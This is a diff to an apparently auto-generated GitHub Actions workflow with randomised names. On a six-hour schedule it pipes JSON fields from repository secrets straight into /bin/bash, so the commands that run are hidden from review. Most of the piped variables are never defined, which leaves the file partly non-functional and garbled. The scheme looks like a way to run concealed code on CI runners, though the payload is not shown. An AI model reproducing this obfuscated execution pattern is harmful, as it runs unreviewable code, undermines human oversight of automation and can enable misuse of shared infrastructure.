@@ -3,31 +3,27 @@ name: shenjushou7610
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 2/6 * * *'
+    - cron: '46 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: shenjushou7610
         env:
-          n78985: ${{ secrets.n78985 }}
+          onlv000: ${{ secrets.onlv000 }}
         run: |
-          echo $n78985 | jq -r .ik9351 | /bin/bash
-          echo $lsgy763 | jq -r .s32872 | /bin/bash
-          echo $frehb770 | jq -r .u6 | /bin/bash
-          echo $gf98203 | jq -r .aahd248 | /bin/bash
-          echo $m6 | jq -r .ne117 | /bin/bash
-          echo $xlxui3 | jq -r .mkw7444 | /bin/bash
-          echo $hf177 | jq -r .ov467 | /bin/bash
-          echo $xjy710 | jq -r .imt3490 | /bin/bash
-          echo $g67870 | jq -r .fs0776 | /bin/bash
-          echo $azasz392 | jq -r .qorte71396 | /bin/bash
-          echo $vqsn572 | jq -r .ff4950 | /bin/bash
-          echo $onyd4107 | jq -r .o2883 | /bin/bash
-          echo $diahj6 | jq -r .h188 | /bin/bash
-          echo $pc2 | jq -r .mj950 | /bin/bash
-          echo $xzjxq890 | jq -r .bmt169 | /bin/bash
-          echo $ft1218 | jq -r .v667 | /bin/bash
+          echo $onlv000 | jq -r .iwv56230 | /bin/bash
+          echo $hsac8855 | jq -r .ggsdr9610 | /bin/bash
+          echo $jv99 | jq -r .jmqo169 | /bin/bash
+          echo $vh8902 | jq -r .jmw4 | /bin/bash
+          echo $fjdx17 | jq -r .zt90761 | /bin/bash
+          echo $fnpd5 | jq -r .vagwc76520 | /bin/bash
+          echo $rnkai0550 | jq -r .qtsk287 | /bin/bash
+          echo $fo1794 | jq -r .wi1923 | /bin/bash
+          echo $ax3273 | jq -r .otn7 | /bin/bash
+          echo $ad0 | jq -r .wvfi07649 | /bin/bash
+          echo $r7 | jq -r .f78 | /bin/bash
+          echo $m3523 | jq -r .fnpe66213 | /bin/bash
 
